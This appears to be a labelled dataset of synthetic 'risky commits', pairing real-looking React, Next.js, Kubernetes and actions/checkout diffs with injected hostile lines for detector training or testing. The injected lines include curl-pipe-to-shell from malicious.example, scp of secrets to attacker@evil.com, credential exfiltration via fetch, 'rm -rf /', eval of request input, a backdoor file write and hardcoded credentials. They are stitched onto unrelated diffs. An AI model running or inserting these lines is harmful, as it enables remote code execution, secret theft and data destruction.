= prevKeyPath$jscomp$1; return; case REACT_ACTIVITY_TYPE: - type = task.blockedSegment; - null === type - ? ""hidden"" !== props.mode && - ((type = task.keyPath) - (task.keyPath = keyPath) - renderNode(request task props.children -1) - (task.keyPath = type)) - : ""hidden"" !== props.mode && - (type.chunks.push(startActivityBoundary) - (type.lastPushedText = !1) - (newProps = task.keyPath) - (task.keyPath = keyPath) - renderNode(request task props.children -1) - (task.keyPath = newProps) - type.chunks.push(endActivityBoundary) - (type.lastPushedText = !1)); + var segment$jscomp$0 = task.blockedSegment; + if (null === segment$jscomp$0) { + if (""hidden"" !== props.mode) { + var prevKeyPath$jscomp$2 = task.keyPath; + task.keyPath = keyPath; + renderNode(request task props.children -1); + task.keyPath = prevKeyPath$jscomp$2; + } + } else if (""hidden"" !== props.mode) { + segment$jscomp$0.chunks.push(startActivityBoundary); + segment$jscomp$0.lastPushedText = !1; + var prevKeyPath$46 = task.keyPath; + task.keyPath = keyPath; + renderNode(request task props.children -1); + task.keyPath = prevKeyPath$46; + segment$jscomp$0.chunks.push(endActivityBoundary); + segment$jscomp$0.lastPushedText = !1; + } return; case REACT_SUSPENSE_LIST_TYPE: a: { - type = props.children; - props = props.revealOrder; + var children$jscomp$0 = props.children + revealOrder = props.revealOrder; if ( - ""forwards"" === props || - ""backwards"" === props || - ""unstable_legacy-backwards"" === props + ""forwards"" === revealOrder || + ""backwards"" === revealOrder || + ""unstable_legacy-backwards"" === revealOrder ) { - if (isArrayImpl(type)) { - renderSuspenseListRows(request task keyPath type props); + if (isArrayImpl(children$jscomp$0)) { + renderSuspenseListRows( + request + task + keyPath + children$jscomp$0 + revealOrder + ); break a; } - if ((newProps = getIteratorFn(type))) - if ((newProps = newProps.call(type))) { - defaultProps = newProps.next(); - if (!defaultProps.done) { - do defaultProps = newProps.next(); - while (!defaultProps.done); - renderSuspenseListRows(request task keyPath type props); + var iteratorFn = getIteratorFn(children$jscomp$0); + if (iteratorFn) { + var iterator = iteratorFn.call(children$jscomp$0); + if (iterator) { + var step = iterator.next(); + if (!step.done) { + do step = iterator.next(); + while (!step.done); + renderSuspenseListRows( + request + task + keyPath + children$jscomp$0 + revealOrder + ); } break a; } + } + } + if (""together"" === revealOrder) { + var prevKeyPath$40 = task.keyPath + prevRow = task.row + newRow = (task.row = createSuspenseListRow(null)); + newRow.boundaries = []; + newRow.together = !0; + task.keyPath = keyPath; + renderNodeDestructive(request task children$jscomp$0 -1); + 0 === --newRow.pendingTasks && + finishSuspenseListRow(request newRow); + task.keyPath = prevKeyPath$40; + task.row = prevRow; + null !== prevRow && + 0 < newRow.pendingTasks && + (prevRow.pendingTasks++ (newRow.next = prevRow)); + } else { + var prevKeyPath$jscomp$3 = task.keyPath; + task.keyPath = keyPath; + renderNodeDestructive(request task children$jscomp$0 -1); + task.keyPath = prevKeyPath$jscomp$3; } - ""together"" === props - ? ((props = task.keyPath) - (newProps = task.row) - (defaultProps = task.row = createSuspenseListRow(null)) - (defaultProps.boundaries = []) - (defaultProps.together = !0) - (task.keyPath = keyPath) - renderNodeDestructive(request task type -1) - 0 === --defaultProps.pendingTasks && - finishSuspenseListRow(request defaultProps) - (task.keyPath = props) - (task.row = newProps) - null !== newProps && - 0 < defaultProps.pendingTasks && - (newProps.pendingTasks++ (defaultProps.next = newProps))) - : ((props = task.keyPath) - (task.keyPath = keyPath) - renderNodeDestructive(request task type -1) - (task.keyPath = props)); } return; case REACT_VIEW_TRANSITION_TYPE: + var prevContext$jscomp$0 = task.formatContext + prevKeyPath$jscomp$4 = task.keyPath; + var resumableState$jscomp$0 = request.resumableState; + if (null != props.name && ""auto"" !== props.name) + var JSCompiler_inline_result$jscomp$2 = props.name; + else { + var treeId = getTreeId(task.treeContext); + JSCompiler_inline_result$jscomp$2 = makeId( + resumableState$jscomp$0 + treeId + 0 + ); + } + var autoName = JSCompiler_inline_result$jscomp$2 + resumableState$jscomp$1 = request.resumableState + update = getViewTransitionClassName(props.default props.update) + enter = getViewTransitionClassName(props.default props.enter) + exit = getViewTransitionClassName(props.default props.exit) + share = getViewTransitionClassName(props.default props.share) + name = props.name; + null == update && (update = ""auto""); + null == enter && (enter = ""auto""); + null == exit && (exit = ""auto""); + if (null == name) { + var parentViewTransition = prevContext$jscomp$0.viewTransition; + null !== parentViewTransition + ? ((name = parentViewTransition.name) + (share = parentViewTransition.share)) + : ((name = ""auto"") (share = ""none"")); + } else + null == share && (share = ""auto"") + prevContext$jscomp$0.tagScope & 4 && + (resumableState$jscomp$1.instructions |= 128); + prevContext$jscomp$0.tagScope & 8 + ? (resumableState$jscomp$1.instructions |= 128) + : (exit = ""none""); + prevContext$jscomp$0.tagScope & 16 + ? (resumableState$jscomp$1.instructions |= 128) + : (enter = ""none""); + var viewTransition = { + update: update + enter: enter + exit: exit + share: share + name: name + autoName: autoName + nameIdx: 0 + } + subtreeScope = prevContext$jscomp$0.tagScope & -25; + subtreeScope = + ""none"" !== update ? subtreeScope | 32 : subtreeScope & -33; + ""none"" !== enter && (subtreeScope |= 64); + var JSCompiler_inline_result$jscomp$3 = createFormatContext( + prevContext$jscomp$0.insertionMode + prevContext$jscomp$0.selectedValue + subtreeScope + viewTransition + ); + task.formatContext = JSCompiler_inline_result$jscomp$3; + task.keyPath = keyPath; + if (null != props.name && ""auto"" !== props.name) + renderNodeDestructive(request task props.children -1); + else { + var prevTreeContext = task.treeContext; + task.treeContext = pushTreeContext(prevTreeContext 1 0); + renderNode(request task props.children -1); + task.treeContext = prevTreeContext; + } + task.formatContext = prevContext$jscomp$0; + task.keyPath = prevKeyPath$jscomp$4; + return; case REACT_SCOPE_TYPE: throw Error(formatProdErrorMessage(343)); case REACT_SUSPENSE_TYPE: a: if (null !== task.replay) { - type = task.keyPath; - newProps = task.formatContext; - defaultProps = task.row; + var prevKeyPath$27 = task.keyPath + prevContext$28 = task.formatContext + prevRow$29 = task.row; task.keyPath = keyPath; task.formatContext = getSuspenseContentFormatContext( request.resumableState - newProps + prevContext$28 ); task.row = null; - keyPath = props.children; + var content$30 = props.children; try { - renderNode(request task keyPath -1); + renderNode(request task content$30 -1); } finally { - (task.keyPath = type) - (task.formatContext = newProps) - (task.row = defaultProps); + (task.keyPath = prevKeyPath$27) + (task.formatContext = prevContext$28) + (task.row = prevRow$29); } } else { - type = task.keyPath; - ref = task.formatContext; - var prevRow = task.row; - propName$44 = task.blockedBoundary; - propName = task.blockedPreamble; - var parentHoistableState = task.hoistableState + var prevKeyPath$jscomp$5 = task.keyPath + prevContext$jscomp$1 = task.formatContext + prevRow$jscomp$0 = task.row + parentBoundary = task.blockedBoundary + parentPreamble = task.blockedPreamble + parentHoistableState = task.hoistableState parentSegment = task.blockedSegment - fallback = props.fallback; - props = props.children; - var fallbackAbortSet = new Set(); + fallback = props.fallback + content = props.children + fallbackAbortSet = new Set(); var newBoundary = 2 > task.formatContext.insertionMode ? createSuspenseBoundary( function renderElement(request task keyPath type props ref) { ); contentRootSegment.parentFlushed = !0; if (null !== request.trackedPostpones) { - newProps = task.componentStack; - defaultProps = [keyPath[0] ""Suspense Fallback"" keyPath[2]]; - initialState = [defaultProps[1] defaultProps[2] [] null]; - request.trackedPostpones.workingMap.set(defaultProps initialState); - newBoundary.trackedFallbackNode = initialState; + var suspenseComponentStack = task.componentStack + fallbackKeyPath = [keyPath[0] ""Suspense Fallback"" keyPath[2]] + fallbackReplayNode = [ + fallbackKeyPath[1] + fallbackKeyPath[2] + [] + null + ]; + request.trackedPostpones.workingMap.set( + fallbackKeyPath + fallbackReplayNode + ); + newBoundary.trackedFallbackNode = fallbackReplayNode; task.blockedSegment = boundarySegment; task.blockedPreamble = newBoundary.fallbackPreamble; - task.keyPath = defaultProps; + task.keyPath = fallbackKeyPath; task.formatContext = getSuspenseFallbackFormatContext( request.resumableState - ref + prevContext$jscomp$1 ); task.componentStack = - replaceSuspenseComponentStackWithSuspenseFallbackStack(newProps); + replaceSuspenseComponentStackWithSuspenseFallbackStack( + suspenseComponentStack + ); boundarySegment.status = 6; try { renderNode(request task fallback -1) boundarySegment.lastPushedText && boundarySegment.textEmbedded && boundarySegment.chunks.push(textSeparator) (boundarySegment.status = 1) - finishedSegment(request propName$44 boundarySegment); + finishedSegment(request parentBoundary boundarySegment); } catch (thrownValue) { throw ( ((boundarySegment.status = 12 === request.status ? 3 : 4) thrownValue) ); } finally { (task.blockedSegment = parentSegment) - (task.blockedPreamble = propName) - (task.keyPath = type) - (task.formatContext = ref); + (task.blockedPreamble = parentPreamble) + (task.keyPath = prevKeyPath$jscomp$5) + (task.formatContext = prevContext$jscomp$1); } - task = createRenderTask( + var suspendedPrimaryTask = createRenderTask( request null - props + content -1 newBoundary contentRootSegment function renderElement(request task keyPath type props ref) { task.context task.treeContext null - newProps + suspenseComponentStack ); - pushComponentStack(task); - request.pingedTasks.push(task); + pushComponentStack(suspendedPrimaryTask); + request.pingedTasks.push(suspendedPrimaryTask); } else { task.blockedBoundary = newBoundary; task.blockedPreamble = newBoundary.contentPreamble; function renderElement(request task keyPath type props ref) { task.keyPath = keyPath; task.formatContext = getSuspenseContentFormatContext( request.resumableState - ref + prevContext$jscomp$1 ); task.row = null; contentRootSegment.status = 6; try { if ( - (renderNode(request task props -1) + (renderNode(request task content -1) contentRootSegment.lastPushedText && contentRootSegment.textEmbedded && contentRootSegment.chunks.push(textSeparator) function renderElement(request task keyPath type props ref) { ((newBoundary.status = 1) !isEligibleForOutlining(request newBoundary)) ) { - null !== prevRow && - 0 === --prevRow.pendingTasks && - finishSuspenseListRow(request prevRow); + null !== prevRow$jscomp$0 && + 0 === --prevRow$jscomp$0.pendingTasks && + finishSuspenseListRow(request prevRow$jscomp$0); 0 === request.pendingRootTasks && task.blockedPreamble && preparePreamble(request); break a; } } else - null !== prevRow && - prevRow.together && - tryToResolveTogetherRow(request prevRow); + null !== prevRow$jscomp$0 && + prevRow$jscomp$0.together && + tryToResolveTogetherRow(request prevRow$jscomp$0); } catch (thrownValue$31) { - (newBoundary.status = 4) - 12 === request.status - ? ((contentRootSegment.status = 3) - (newProps = request.fatalError)) - : ((contentRootSegment.status = 4) - (newProps = thrownValue$31)) - (defaultProps = getThrownInfo(task.componentStack)) - (initialState = logRecoverableError( - request - newProps - defaultProps - )) - (newBoundary.errorDigest = initialState) - untrackBoundary(request newBoundary); + newBoundary.status = 4; + if (12 === request.status) { + contentRootSegment.status = 3; + var error = request.fatalError; + } else (contentRootSegment.status = 4) (error = thrownValue$31); + var thrownInfo = getThrownInfo(task.componentStack); + var errorDigest = logRecoverableError(request error thrownInfo); + newBoundary.errorDigest = errorDigest; + untrackBoundary(request newBoundary); } finally { - (task.blockedBoundary = propName$44) - (task.blockedPreamble = propName) + (task.blockedBoundary = parentBoundary) + (task.blockedPreamble = parentPreamble) (task.hoistableState = parentHoistableState) (task.blockedSegment = parentSegment) - (task.keyPath = type) - (task.formatContext = ref) - (task.row = prevRow); + (task.keyPath = prevKeyPath$jscomp$5) + (task.formatContext = prevContext$jscomp$1) + (task.row = prevRow$jscomp$0); } - task = createRenderTask( + var suspendedFallbackTask = createRenderTask( request null fallback -1 - propName$44 + parentBoundary boundarySegment newBoundary.fallbackPreamble newBoundary.fallbackState function renderElement(request task keyPath type props ref) { task.componentStack ) ); - pushComponentStack(task); - request.pingedTasks.push(task); + pushComponentStack(suspendedFallbackTask); + request.pingedTasks.push(suspendedFallbackTask); } } return; } if (""object"" === typeof type && null !== type) switch (type.$$typeof) { case REACT_FORWARD_REF_TYPE: - if (""ref"" in props) - for (parentSegment in ((newProps = {}) props)) - ""ref"" !== parentSegment && - (newProps[parentSegment] = props[parentSegment]); - else newProps = props; - type = renderWithHooks( + if (""ref"" in props) { + var propsWithoutRef = {}; + for (var key in props) + ""ref"" !== key && (propsWithoutRef[key] = props[key]); + } else propsWithoutRef = props; + var children$jscomp$1 = renderWithHooks( request task keyPath type.render - newProps + propsWithoutRef ref ); finishFunctionComponent( request task keyPath - type + children$jscomp$1 0 !== localIdCounter actionStateCounter actionStateMatchingIndex function renderElement(request task keyPath type props ref) { renderElement(request task keyPath type.type props ref); return; case REACT_CONTEXT_TYPE: - defaultProps = props.children; - newProps = task.keyPath; - props = props.value; - initialState = type._currentValue; - type._currentValue = props; - ref = currentActiveSnapshot; - currentActiveSnapshot = type = { - parent: ref - depth: null === ref ? 0 : ref.depth + 1 - context: type - parentValue: initialState - value: props - }; - task.context = type; + var children$jscomp$2 = props.children + prevKeyPath$jscomp$6 = task.keyPath + nextValue = props.value; + var prevValue = type._currentValue; + type._currentValue = nextValue; + var prevNode = currentActiveSnapshot + newNode = { + parent: prevNode + depth: null === prevNode ? 0 : prevNode.depth + 1 + context: type + parentValue: prevValue + value: nextValue + }; + currentActiveSnapshot = newNode; + task.context = newNode; task.keyPath = keyPath; - renderNodeDestructive(request task defaultProps -1); - request = currentActiveSnapshot; - if (null === request) throw Error(formatProdErrorMessage(403)); - request.context._currentValue = request.parentValue; - request = currentActiveSnapshot = request.parent; - task.context = request; - task.keyPath = newProps; + renderNodeDestructive(request task children$jscomp$2 -1); + var prevSnapshot = currentActiveSnapshot; + if (null === prevSnapshot) throw Error(formatProdErrorMessage(403)); + prevSnapshot.context._currentValue = prevSnapshot.parentValue; + var JSCompiler_inline_result$jscomp$4 = (currentActiveSnapshot = + prevSnapshot.parent); + task.context = JSCompiler_inline_result$jscomp$4; + task.keyPath = prevKeyPath$jscomp$6; return; case REACT_CONSUMER_TYPE: - props = props.children; - type = props(type._context._currentValue); - props = task.keyPath; + var render = props.children + newChildren = render(type._context._currentValue) + prevKeyPath$jscomp$7 = task.keyPath; task.keyPath = keyPath; - renderNodeDestructive(request task type -1); - task.keyPath = props; + renderNodeDestructive(request task newChildren -1); + task.keyPath = prevKeyPath$jscomp$7; return; case REACT_LAZY_TYPE: - newProps = type._init; - type = newProps(type._payload); + var init = type._init; + var Component = init(type._payload); if (12 === request.status) throw null; - renderElement(request task keyPath type props ref); + renderElement(request task keyPath Component props ref); return; } throw Error( function flushCompletedBoundary(request destination boundary) { request = request.renderState; i = boundary.rootSegmentID; boundary = boundary.contentState; - var requiresStyleInsertion = request.stylesToHoist; + var requiresStyleInsertion = request.stylesToHoist + requiresViewTransitions = 0 !== (completedSegments.instructions & 128); request.stylesToHoist = !1; writeChunk(destination request.startInlineScript); writeChunk(destination endOfStartTag); function flushCompletedBoundary(request destination boundary) { 0 === (completedSegments.instructions & 2) && ((completedSegments.instructions |= 2) writeChunk(destination completeBoundaryScriptFunctionOnly)) + requiresViewTransitions && + 0 === (completedSegments.instructions & 256) && + ((completedSegments.instructions |= 256) + writeChunk( + destination + completeBoundaryUpgradeToViewTransitionsInstruction + )) 0 === (completedSegments.instructions & 8) ? ((completedSegments.instructions |= 8) writeChunk(destination completeBoundaryWithStylesScript1FullPartial)) : writeChunk(destination completeBoundaryWithStylesScript1Partial)) : (0 === (completedSegments.instructions & 2) && ((completedSegments.instructions |= 2) writeChunk(destination completeBoundaryScriptFunctionOnly)) + requiresViewTransitions && + 0 === (completedSegments.instructions & 256) && + ((completedSegments.instructions |= 256) + writeChunk( + destination + completeBoundaryUpgradeToViewTransitionsInstruction + )) writeChunk(destination completeBoundaryScript1Partial)); completedSegments = stringToChunk(i.toString(16)); writeChunk(destination request.boundaryPrefix); function getPostponedState(request) { } function ensureCorrectIsomorphicReactVersion() { var isomorphicReactPackageVersion = React.version; - if (""19.3.0-canary-c7862584-20251006"" !== isomorphicReactPackageVersion) + if (""19.3.0-canary-a4eb2dfa-20251006"" !== isomorphicReactPackageVersion) throw Error( formatProdErrorMessage( 527 isomorphicReactPackageVersion - ""19.3.0-canary-c7862584-20251006"" + ""19.3.0-canary-a4eb2dfa-20251006"" ) ); } exports.resumeAndPrerender = function (children postponedState options) { startWork(request); }); }; -exports.version = ""19.3.0-canary-c7862584-20251006""; +exports.version = ""19.3.0-canary-a4eb2dfa-20251006"";
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_5_7873,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,29,9,38,"function getPostponedState(request) { } function ensureCorrectIsomorphicReactVersion() { var isomorphicReactPackageVersion = React.version; - if (""19.3.0-canary-85c427d8-20251003"" !== isomorphicReactPackageVersion) + if (""19.3.0-canary-4fdf7cf2-20251003"" !== isomorphicReactPackageVersion) throw Error( 'Incompatible React versions: The ""react"" and ""react-dom"" packages must have the exact same version. Instead got:\n - react: ' + (isomorphicReactPackageVersion + - ""\n - react-dom: 19.3.0-canary-85c427d8-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") + ""\n - react-dom: 19.3.0-canary-4fdf7cf2-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") ); } ensureCorrectIsomorphicReactVersion(); exports.resumeToPipeableStream = function (children postponedState options) { } }; }; -exports.version = ""19.3.0-canary-85c427d8-20251003""; +exports.version = ""19.3.0-canary-4fdf7cf2-20251003"";
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_6_1106,Niklas Mischkulnig,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,28,5,33,"import { nextTestSetup } from 'e2e-utils' describe('webpack-loader-fs' () => { - const { next } = nextTestSetup({ + const { next skipped } = nextTestSetup({ files: __dirname skipDeployment: true }) + if (skipped) return + it('should allow reading the input FS' async () => { const $ = await next.render$('/') expect($('#test').text()).toBe(
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_7_3547,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,22,1,23,"exports.useSyncExternalStore = function ( exports.useTransition = function () { return ReactSharedInternals.H.useTransition(); }; -exports.version = ""19.3.0-experimental-4fdf7cf2-20251003""; +exports.version = ""19.3.0-experimental-c7862584-20251006"";
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_8_7224,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,23,5,28,"{ ""name"": ""create-next-app"" - ""version"": ""15.6.0-canary.50"" + ""version"": ""15.6.0-canary.51"" ""keywords"": [ ""react"" ""next""
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
facebook/react,synthetic_9_5333,lauren,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,30,8,38,"function useHookInLoops() { useHook4(); } } + +/** + * Compiler Rules + */ +// Invalid: component factory +function InvalidComponentFactory() { + const DynamicComponent = () => <div>Hello</div>; + // eslint-disable-next-line react-hooks/static-components + return <DynamicComponent />; +} + +// Invalid: mutating globals +function InvalidGlobals() { + // eslint-disable-next-line react-hooks/immutability + window.myGlobal = 42; + return <div>Done</div>; +} + +// Invalid: useMemo with wrong deps - triggers preserve-manual-memoization +function InvalidUseMemo({items}) { + // eslint-disable-next-line react-hooks/preserve-manual-memoization react-hooks/exhaustive-deps + const sorted = useMemo(() => [...items].sort() []); + return <div>{sorted.length}</div>; +}
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
facebook/react,synthetic_10_7201,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,36,4,40,"describe('ReactFragment' () => { React = require('react'); Suspense = React.Suspense; Activity = React.Activity; - ViewTransition = React.unstable_ViewTransition; + ViewTransition = React.ViewTransition; ReactNoop = require('react-noop-renderer'); const InternalTestUtils = require('internal-test-utils'); waitForAll = InternalTestUtils.waitForAll;
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
kubernetes/kubernetes,synthetic_11_6925,joshjms,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,13,1,14,"const ( MinExternalEtcdVersion = ""3.5.21-0"" // DefaultEtcdVersion indicates the default etcd version that kubeadm uses - DefaultEtcdVersion = ""3.6.4-0"" + DefaultEtcdVersion = ""3.6.5-0"" // Etcd defines variable used internally when referring to etcd component Etcd = ""etcd"" var ( 31: ""3.5.21-0"" 32: ""3.5.21-0"" 33: ""3.5.21-0"" - 34: ""3.6.4-0"" + 34: ""3.6.5-0"" } // KubeadmCertsClusterRoleName sets the name for the ClusterRole that allows
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_12_4733,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,6,3,9,"ReactDOMHydrationRoot.prototype.unstable_scheduleHydration = function (target) { }; var isomorphicReactPackageVersion$jscomp$inline_2217 = React.version; if ( - ""19.3.0-experimental-85c427d8-20251003"" !== + ""19.3.0-experimental-4fdf7cf2-20251003"" !== isomorphicReactPackageVersion$jscomp$inline_2217 ) throw Error( formatProdErrorMessage( 527 isomorphicReactPackageVersion$jscomp$inline_2217 - ""19.3.0-experimental-85c427d8-20251003"" + ""19.3.0-experimental-4fdf7cf2-20251003"" ) ); ReactDOMSharedInternals.findDOMNode = function (componentOrElement) { ReactDOMSharedInternals.findDOMNode = function (componentOrElement) { }; var internals$jscomp$inline_2914 = { bundleType: 0 - version: ""19.3.0-experimental-85c427d8-20251003"" + version: ""19.3.0-experimental-4fdf7cf2-20251003"" rendererPackageName: ""react-dom"" currentDispatcherRef: ReactSharedInternals - reconcilerVersion: ""19.3.0-experimental-85c427d8-20251003"" + reconcilerVersion: ""19.3.0-experimental-4fdf7cf2-20251003"" }; if (""undefined"" !== typeof __REACT_DEVTOOLS_GLOBAL_HOOK__) { var hook$jscomp$inline_2915 = __REACT_DEVTOOLS_GLOBAL_HOOK__; exports.hydrateRoot = function (container initialChildren options) { listenToAllSupportedEvents(container); return new ReactDOMHydrationRoot(initialChildren); }; -exports.version = ""19.3.0-experimental-85c427d8-20251003""; +exports.version = ""19.3.0-experimental-4fdf7cf2-20251003"";
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
facebook/react,synthetic_13_7227,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,run.sh,30,10,40,"""fast-glob"": ""^3.3.2"" ""ora"": ""5.4.1"" ""yargs"": ""^17.7.2"" - ""zod"": ""^3.22.4"" - ""zod-validation-error"": ""^3.0.3"" + ""zod"": ""^3.22.4 || ^4.0.0"" + ""zod-validation-error"": ""^3.0.3 || ^4.0.0"" } ""devDependencies"": {} ""engines"": {
+ this.constructor.constructor('return process')().exit()",1
facebook/react,synthetic_14_3664,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,run.sh,23,3,26,"export { unstable_Scope unstable_SuspenseList unstable_TracingMarker - unstable_ViewTransition - unstable_addTransitionType + ViewTransition + addTransitionType unstable_getCacheForType unstable_useCacheRefresh useId
+ eval(request.getParameter(""user_input""))",1
actions/checkout,synthetic_15_2169,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,11,8,19,"inputs: and `CheckHostIP=no` to the SSH command line. Use the input `ssh-known-hosts` to configure additional hosts. default: true + ssh-user: + description: > + The user to use when connecting to the remote SSH host. By default 'git' is used. + default: git persist-credentials: description: 'Whether to configure the token or SSH key with the local git config' default: true
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_16_3677,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,25,4,29,"{ ""name"": ""@next/codemod"" - ""version"": ""15.6.0-canary.44"" + ""version"": ""15.6.0-canary.45"" ""license"": ""MIT"" ""repository"": { ""type"": ""git""
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
kubernetes/kubernetes,synthetic_17_4598,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,21,0,21,"spec: imagePullPolicy: Never args: [ ""--etcd-servers=http://localhost:2379"" ] - name: etcd - image: gcr.io/etcd-development/etcd:v3.6.4 + image: registry.k8s.io/etcd:v3.6.5
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_18_1525,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,run.sh,26,4,30,"export { unstable_LegacyHidden unstable_Scope unstable_SuspenseList - unstable_ViewTransition + ViewTransition + ViewTransition as unstable_ViewTransition unstable_TracingMarker - unstable_addTransitionType + addTransitionType + addTransitionType as unstable_addTransitionType unstable_useCacheRefresh use useActionState
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
actions/checkout,synthetic_19_4456,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,21,3,24,"--- name: ""@octokit/auth-token"" -version: 2.5.0 +version: 4.0.0 type: npm summary: GitHub API token authentication for browsers and Node.js homepage:
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_20_7482,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,30,2,32,"{ ""name"": ""@next/bundle-analyzer"" - ""version"": ""15.6.0-canary.47"" + ""version"": ""15.6.0-canary.48"" ""main"": ""index.js"" ""types"": ""index.d.ts"" ""license"": ""MIT""
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_21_3287,Hendrik Liebau,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,36,8,44,"let createDebugChannel: | typeof import('../../../dev/debug-channel').createDebugChannel | undefined -if (process.env.NODE_ENV !== 'production') { +if ( + process.env.NODE_ENV !== 'production' && + process.env.__NEXT_REACT_DEBUG_CHANNEL +) { createDebugChannel = ( require('../../../dev/debug-channel') as typeof import('../../../dev/debug-channel') ).createDebugChannel
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_22_8019,Eugene Choi,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,26,5,31,"export default function TabbedWindow({ tabs activeTab onTabChange + activeTabOverride }: { tabs: Map<string React.ReactNode>; activeTab: string; onTabChange: (tab: string) => void; + activeTabOverride?: string; }): React.ReactElement { + const currentActiveTab = activeTabOverride ? activeTabOverride : activeTab; + const id = useId(); const transitionName = `tab-highlight-${id}`; export default function TabbedWindow({ <div className=""flex flex-col h-full max-w-full""> <div className=""flex p-2 flex-shrink-0""> {Array.from(tabs.keys()).map(tab => { - const isActive = activeTab === tab; + const isActive = currentActiveTab === tab; return ( <button key={tab} export default function TabbedWindow({ {isActive && ( <ViewTransition name={transitionName} + enter={{default: 'none'}} + exit={{default: 'none'}} share={{ [TOGGLE_TAB_TRANSITION]: 'tab-highlight' default: 'none' export default function TabbedWindow({ </ViewTransition> )} <ViewTransition + enter={{default: 'none'}} + exit={{default: 'none'}} update={{ [TOGGLE_TAB_TRANSITION]: 'tab-text' default: 'none' export default function TabbedWindow({ })} </div> <div className=""flex-1 overflow-hidden w-full h-full""> - {tabs.get(activeTab)} + {tabs.get(currentActiveTab)} </div> </div> </div>
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_23_3266,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,32,1,33,"export type RendererInterface = { onErrorOrWarning?: OnErrorOrWarning overrideError: (id: number forceError: boolean) => void overrideSuspense: (id: number forceFallback: boolean) => void - overrideSuspenseMilestone: ( - rootID: number - suspendedSet: Array<number> - ) => void + overrideSuspenseMilestone: (suspendedSet: Array<number>) => void overrideValueAtPath: ( type: Type id: number
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_24_2796,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,11,10,21,"exports.useFormState = function (action initialState permalink) { exports.useFormStatus = function () { return ReactSharedInternals.H.useHostTransitionStatus(); }; -exports.version = ""19.3.0-canary-85c427d8-20251003""; +exports.version = ""19.3.0-canary-4fdf7cf2-20251003"";
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
actions/checkout,synthetic_25_2040,Salman Chishti,2025-10-15 12:40:39,Synthetic risky commit,config.env,25,9,34,"module.exports = __toCommonJS(dist_src_exports); var import_universal_user_agent = __nccwpck_require__(5030); // pkg/dist-src/version.js -var VERSION = ""9.0.5""; +var VERSION = ""9.0.6""; // pkg/dist-src/defaults.js var userAgent = `octokit-endpoint.js/${VERSION} ${(0 import_universal_user_agent.getUserAgent)()}`; function addQueryParameters(url parameters) { } // pkg/dist-src/util/extract-url-variable-names.js -var urlVariableRegex = /\{[^}]+\}/g; +var urlVariableRegex = /\{[^{}}]+\}/g; function removeNonChars(variableName) { - return variableName.replace(/^\W+|\W+$/g """").split(/ /); + return variableName.replace(/(?:^\W+)|(?:(?<!\W)\W+$)/g """").split(/ /); } function extractUrlVariableNames(url) { const matches = url.match(urlVariableRegex); function parse(options) { } if (url.endsWith(""/graphql"")) { if (options.mediaType.previews?.length) { - const previewsFromAcceptHeader = headers.accept.match(/[\w-]+(?=-preview)/g) || []; + const previewsFromAcceptHeader = headers.accept.match(/(?<![\w-])[\w-]+(?=-preview)/g) || []; headers.accept = previewsFromAcceptHeader.concat(options.mediaType.previews).map((preview) => { const format = options.mediaType.format ? `.${options.mediaType.format}` : ""+json""; return `application/vnd.github.${preview}-preview${format}`; __export(dist_src_exports { module.exports = __toCommonJS(dist_src_exports); // pkg/dist-src/version.js -var VERSION = ""9.2.1""; +var VERSION = ""9.2.2""; // pkg/dist-src/normalize-paginated-list-response.js function normalizePaginatedListResponse(response) { function iterator(octokit route parameters) { const response = await requestMethod({ method url headers }); const normalizedResponse = normalizePaginatedListResponse(response); url = ((normalizedResponse.headers.link || """").match( - /<([^>]+)>;\s*rel=""next""/ + /<([^<>]+)>;\s*rel=""next""/ ) || [])[1]; return { value: normalizedResponse }; } catch (error) { var RequestError = class extends Error { if (options.request.headers.authorization) { requestCopy.headers = Object.assign({} options.request.headers { authorization: options.request.headers.authorization.replace( - / .*$/ + /(?<! ) .*$/ "" [REDACTED]"" ) }); var import_endpoint = 